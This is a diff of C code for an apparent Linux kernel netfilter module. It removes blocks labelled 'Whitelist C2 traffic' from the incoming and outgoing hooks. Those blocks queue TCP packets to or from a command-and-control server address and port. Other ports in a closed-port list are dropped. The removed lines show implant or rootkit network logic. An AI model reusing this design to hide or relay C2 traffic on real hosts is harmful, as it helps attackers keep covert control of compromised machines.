@@ -443,21 +443,6 @@ unsigned int incoming_hook(void* priv, struct sk_buff* skb, const struct nf_hook
     if (ip_header->protocol == IPPROTO_TCP) {
         tcp_header = (struct tcphdr*) skb_transport_header(skb);
 
-        //Whitelist C2 traffic
-        if (ntohs(tcp_header->source) == PORT || ntohs(tcp_header->dest) == PORT) {
-            if (ip_header->saddr == SERVER_IP || ip_header->daddr == SERVER_IP) {
-                return NF_QUEUE;
-            }
-        }
-#if 0
-        if (ntohs(tcp_header->source) == PORT && ip_header->saddr == SERVER_IP) {
-            return NF_QUEUE;
-        }
-        if (ntohs(tcp_header->dest) == PORT && ip_header->daddr == SERVER_IP) {
-            return NF_QUEUE;
-        }
-#endif
-
         for (i = 0; i < closed_port_count; ++i) {
             if (ntohs(tcp_header->dest) == closed_ports[i]) {
                 return NF_DROP;
@@ -509,21 +494,6 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
 
     if (ip_header->protocol == IPPROTO_TCP) {
         tcp_header = (struct tcphdr*) skb_transport_header(skb);
-
-        //Whitelist C2 traffic
-        if (ntohs(tcp_header->source) == PORT || ntohs(tcp_header->dest) == PORT) {
-            if (ip_header->saddr == SERVER_IP || ip_header->daddr == SERVER_IP) {
-                return NF_QUEUE;
-            }
-        }
-#if 0
-        if (ntohs(tcp_header->dest) == PORT && ip_header->daddr == SERVER_IP) {
-            return NF_QUEUE;
-        }
-        if (ntohs(tcp_header->source) == PORT && ip_header->saddr == SERVER_IP) {
-            return NF_QUEUE;
-        }
-#endif
 
         for (i = 0; i < closed_port_count; ++i) {
             if (ntohs(tcp_header->source) == closed_ports[i]) {
